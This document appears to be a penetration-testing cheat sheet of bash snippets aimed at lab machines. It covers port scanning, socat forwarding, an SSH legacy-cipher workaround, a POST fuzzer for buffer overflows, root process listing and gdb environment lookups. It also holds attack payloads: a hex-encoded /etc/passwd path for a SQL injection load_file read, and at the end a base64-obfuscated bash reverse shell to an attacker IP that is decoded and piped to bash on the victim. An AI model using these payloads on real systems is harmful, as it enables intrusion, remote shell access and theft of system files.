## Forward UDP to TCP
```bash
socat -T15 udp4-recvfrom:53,reuseaddr,fork tcp:0.0.0.0:5353
socat tcp4-listen:5353,reuseaddr,fork UDP:8.8.8.8:53
```

## Port scanning
- Bash scripting

```bash
#!/bin/bash

# ports=(21 22 53 80 443 3306 8443 8080)
ports=`seq 1 5000`
for port in ${ports[@]}; do
   timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/127.0.0.1/$port && echo $port is open" 2>/dev/null
done
```

```bash
# scan
$ seq 1000 5000 | xargs -P 50 -I{} proxychains nc -znv -w 1 10.1.1.95 {} 2>&1 | tee -a ports

# look for open ports
$ grep -v refused ports -A1 | grep open
```

## SSH - unable to negotiate
- Problem
```bash
$ ssh alice@10.11.1.141
Unable to negotiate with 10.11.1.141 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

- Solution
```bash
$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 alice@10.11.1.141
```

## HTTP fuzzer (bash)
```bash
for i in {100..2000..100}; do
  echo Sending $i bytes
  payload=$(perl -e "print 'A'x$i")
  curl -si -X POST "http://192.168.123.10/login" --data "username=$payload&password=BBBB" --connect-timeout 1 > /dev/null
  if [ $? != 0 ]; then
    echo Could not connect
	break
  fi
done
```

## Python2.7 Virtual Environment
```bash
virtualenv --python=python2.7 venv
source venv/bin/activate
pip install -r requirements.txt
...
...
deactivate
```

## Hex Encoding
Useful to send via SQL Injection (e.g MYSQL)
```
$ echo -n /etc/passwd | xxd -p
2f6574632f706173737764

$ echo -n 2f6574632f706173737764 | xxd -r -p
/etc/passwd

Ex: load_file(0x2f6574632f706173737764)
```

## Processes owned by root
```bash
ps -Af | grep -E '^root'
ps -Af | awk '$1 == "root" {print $0}' | grep -vE '\[.+?\]|/lib/systemd/'
```

## Generate random string
```bash
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1
```

## To find out ENV address in gdb

```
(gdb) x/s *((char **)environ)

To get address of the next env variable (2 ways)
  1. Press enter
  2. x/s *((char **)environ + N
```

## Reverse Shell

```
attacker$ echo -n 'bash -i  >& /dev/tcp/10.10.2.165/4444 0>&1' | base64 -w0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMi4xNjUvNDQ0NCAwPiYx

victim$ echo -n 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMi4xNjUvNDQ0NCAwPiYx'|base64 -d|bash
```
